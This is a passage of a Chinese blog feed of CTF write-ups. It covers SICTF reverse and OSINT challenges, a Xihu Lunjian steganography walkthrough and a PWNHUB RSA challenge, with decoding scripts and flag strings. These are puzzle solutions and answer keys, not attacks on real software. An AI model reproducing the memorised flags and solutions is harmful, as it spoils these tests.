title="xy"></a>xy</h4><p>解方程平方和，sage上的函数 two_squares() 可以求出x,y</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sage</span><br>enc = <br>x_y= <span class="hljs-title function_ invoke__">two_squares</span>(enc)<br><span class="hljs-keyword">print</span>(x_y)<br></code></pre></td></tr></table></figure><p>不会写交互，手撸<br><img src="/mdimg/sictf/37.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h4 id="LiHua’s-checkme"><a href="#LiHua’s-checkme" class="headerlink" title="LiHua’s checkme"></a>LiHua’s checkme</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>           <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-number">114433</span>)<br>            <span class="hljs-number">2</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-number">114459</span>)<br>            <span class="hljs-number">4</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">114449</span>)<br>            <span class="hljs-number">6</span> LOAD_CONST               <span class="hljs-number">3</span> (<span class="hljs-number">114438</span>)<br>            <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">4</span> (<span class="hljs-number">114452</span>)<br>           <span class="hljs-number">10</span> LOAD_CONST               <span class="hljs-number">5</span> (<span class="hljs-number">114473</span>)<br>           <span class="hljs-number">12</span> LOAD_CONST               <span class="hljs-number">6</span> (<span class="hljs-number">114480</span>)<br>           <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">16</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">18</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">20</span> LOAD_CONST              <span class="hljs-number">10</span> (<span class="hljs-number">114528</span>)<br>           <span class="hljs-number">22</span> LOAD_CONST              <span class="hljs-number">11</span> (<span class="hljs-number">114483</span>)<br>           <span class="hljs-number">24</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">26</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">28</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">30</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">32</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">34</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">36</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">38</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">40</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">42</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">44</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">46</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">48</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">50</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">52</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">54</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">56</span> LOAD_CONST              <span class="hljs-number">19</span> (<span class="hljs-number">114535</span>)<br>           <span class="hljs-number">58</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">60</span> LOAD_CONST              <span class="hljs-number">20</span> (<span class="hljs-number">114533</span>)<br>           <span class="hljs-number">62</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">64</span> LOAD_CONST              <span class="hljs-number">21</span> (<span class="hljs-number">114529</span>)<br>           <span class="hljs-number">66</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">68</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">70</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">72</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">74</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">76</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">78</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">80</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">82</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">84</span> LOAD_CONST              <span class="hljs-number">22</span> (<span class="hljs-number">114479</span>)<br>           <span class="hljs-number">86</span> BUILD_LIST              <span class="hljs-number">43</span><br>           <span class="hljs-number">88</span> STORE_NAME               <span class="hljs-number">0</span> (flags)<br><br><span class="hljs-number">2</span>          <span class="hljs-number">90</span> LOAD_NAME                <span class="hljs-number">1</span> (<span class="hljs-built_in">input</span>)<br>           <span class="hljs-number">92</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>           <span class="hljs-number">94</span> STORE_NAME               <span class="hljs-number">2</span> (flag)<br><br><span class="hljs-number">3</span>          <span class="hljs-number">96</span> LOAD_CONST              <span class="hljs-number">23</span> (<span class="hljs-number">0</span>)<br>           <span class="hljs-number">98</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br><br><span class="hljs-number">4</span>         <span class="hljs-number">100</span> SETUP_LOOP              <span class="hljs-number">52</span> (to <span class="hljs-number">154</span>)<br>          <span class="hljs-number">102</span> LOAD_NAME                <span class="hljs-number">4</span> (<span class="hljs-built_in">range</span>)<br>          <span class="hljs-number">104</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">106</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">108</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">110</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">112</span> GET_ITER<br>      &gt;&gt;  <span class="hljs-number">114</span> FOR_ITER                <span class="hljs-number">36</span> (to <span class="hljs-number">152</span>)<br>          <span class="hljs-number">116</span> STORE_NAME               <span class="hljs-number">6</span> (i)<br><br><span class="hljs-number">5</span>         <span class="hljs-number">118</span> LOAD_NAME                <span class="hljs-number">7</span> (<span class="hljs-built_in">ord</span>)<br>          <span class="hljs-number">120</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">122</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">124</span> BINARY_SUBSCR<br>          <span class="hljs-number">126</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">128</span> LOAD_CONST              <span class="hljs-number">24</span> (<span class="hljs-number">114514</span>)<br>          <span class="hljs-number">130</span> BINARY_XOR<br>          <span class="hljs-number">132</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">134</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">136</span> BINARY_SUBSCR<br>          <span class="hljs-number">138</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">140</span> POP_JUMP_IF_FALSE      <span class="hljs-number">114</span><br><br><span class="hljs-number">6</span>         <span class="hljs-number">142</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">144</span> LOAD_CONST              <span class="hljs-number">25</span> (<span class="hljs-number">1</span>)<br>          <span class="hljs-number">146</span> INPLACE_ADD<br>          <span class="hljs-number">148</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">150</span> JUMP_ABSOLUTE          <span class="hljs-number">114</span><br>      &gt;&gt;  <span class="hljs-number">152</span> POP_BLOCK<br><br><span class="hljs-number">7</span>     &gt;&gt;  <span class="hljs-number">154</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">156</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">158</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">160</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">162</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">164</span> POP_JUMP_IF_FALSE      <span class="hljs-number">174</span><br><br><span class="hljs-number">8</span>         <span class="hljs-number">166</span> LOAD_NAME                <span class="hljs-number">8</span> (<span class="hljs-built_in">print</span>)<br>          <span class="hljs-number">168</span> LOAD_CONST              <span class="hljs-number">26</span> (<span class="hljs-string">&#x27;True!&#x27;</span>)<br>          <span class="hljs-number">170</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">172</span> POP_TOP<br>      &gt;&gt;  <span class="hljs-number">174</span> LOAD_CONST              <span class="hljs-number">27</span> (<span class="hljs-literal">None</span>)<br>          <span class="hljs-number">176</span> RETURN_VALUE<br></code></pre></td></tr></table></figure><blockquote><p>根据字节码还原python脚本 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flags = [<span class="hljs-number">114433</span>, <span class="hljs-number">114459</span>, <span class="hljs-number">114449</span>, <span class="hljs-number">114438</span>, <span class="hljs-number">114452</span>, <span class="hljs-number">114473</span>, <span class="hljs-number">114480</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114528</span>, <span class="hljs-number">114483</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114535</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114533</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114529</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114479</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:<br>    flag += <span class="hljs-built_in">chr</span>(i^<span class="hljs-number">114514</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#SICTF&#123;b01e2a1f-096d-4fd8-8f95-7e388d694911&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Super-Mario-Bros"><a href="#Super-Mario-Bros" class="headerlink" title="Super Mario Bros"></a>Super Mario Bros</h4><p>原项目：<a href="https://github.com/heart6622/python_SuperMario">https://github.com/heart6622/python_SuperMario</a><br>用python3.10正确反编译<br>题目提示源码在./source目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import <span class="hljs-keyword">xor</span><br>s=[<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">23</span>, <span class="hljs-number">109</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">58</span>, <span class="hljs-number">71</span>, <span class="hljs-number">22</span>, <span class="hljs-number">51</span>, <span class="hljs-number">82</span>, <span class="hljs-number">93</span>, <span class="hljs-number">20</span>, <span class="hljs-number">92</span>, <span class="hljs-number">93</span>, <span class="hljs-number">28</span>, <span class="hljs-number">41</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">78</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">16</span>]<br>key= <span class="hljs-string">&#x27;level num&#x27;</span><br><span class="hljs-keyword">print</span> (<span class="hljs-keyword">xor</span>(s,key))<br></code></pre></td></tr></table></figure><h4 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h4><p>xtea    算法<br>re✌的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-type">uint32_t</span>  delta = <span class="hljs-number">0x61C88647</span>, sum = delta * num_rounds;<br>        <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">2</span> * j], v1 = v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br><br>            v1 -= ((((v0 * <span class="hljs-number">8</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])) ^ <span class="hljs-number">3</span>;<br>            sum -= delta;<br>            v0 -= (((v1 * <span class="hljs-number">8</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br><br>        v[<span class="hljs-number">2</span> * j] = v0; v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = v1;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>] = &#123; <span class="hljs-number">0xab603776</span>,<span class="hljs-number">0xb9b07148</span>,<span class="hljs-number">0xbff5ec79</span>,<span class="hljs-number">0x4e93cb5e</span>,<span class="hljs-number">0xcbb3b436</span>,<span class="hljs-number">0x41d24b4d</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x12345678</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x23456789</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x34567890</span> ,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x45678901</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    decipher(r, v, k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">3</span>; j &gt;= <span class="hljs-number">0</span>; j--)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v[i] &gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;t5a_1s_very_n1C5!!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h4 id="朋友圈中的秘密"><a href="#朋友圈中的秘密" class="headerlink" title="朋友圈中的秘密"></a>朋友圈中的秘密</h4><p><img src="/mdimg/sictf/38.png"><br><strong>面向出题人做题法：</strong><br><strong>一眼丁真汉堡王（桌子上的可乐）</strong><br>地图查找左上角的商家（顺义区）（树木是顺义区的）<br>范围很小，一个一个试就行<br><img src="/mdimg/sictf/39.png"><code>SICTF&#123;北京市-顺义区-新顺南大街-11号-汉堡王&#125;                        </code></p><h4 id="小镇后面的山"><a href="#小镇后面的山" class="headerlink" title="小镇后面的山"></a>小镇后面的山</h4><p><img src="/mdimg/sictf/40.png"><br>直接google识图<br><img src="/mdimg/sictf/41.png"><br>随便搜都能找到，然后查了一下这个地方，确实有一个大学<br><a href="https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/">https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/</a><br><code>SICTF&#123;格勒诺布尔-阿尔卑斯山脉&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑2022初赛</title>
    <link href="/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/02/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="MP3"><a href="#MP3" class="headerlink" title="MP3"></a>MP3</h3><p>下载得到一个mp3文件，foremost分离出来一个图片<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/1.png"><br>zsteg看看<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/2.png"><br>zsteg提取<br><code>zsteg -e b1,r,lsb,xy 6.png &gt; 6.zip  </code><br><img src="/mdimg/%E8%A5%BF%E6%B9%96/3.png"><br>MP3stego：<a href="https://www.petitcolas.net/steganography/mp3stego/">https://www.petitcolas.net/steganography/mp3stego/</a><br>项目源码：<a href="https://github.com/fabienpe/MP3Stego">https://github.com/fabienpe/MP3Stego</a><br><img src="/mdimg/%E8%A5%BF%E6%B9%96/4.png"><br>得到压缩包密码 8750d5109208213f<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/5.png"><br>解压缩包<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/6.png"><br>rot47<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/7.png"><br>js解码，控制台<br><img src="/mdimg/%E8%A5%BF%E6%B9%96/8.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022PWNHUB冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span 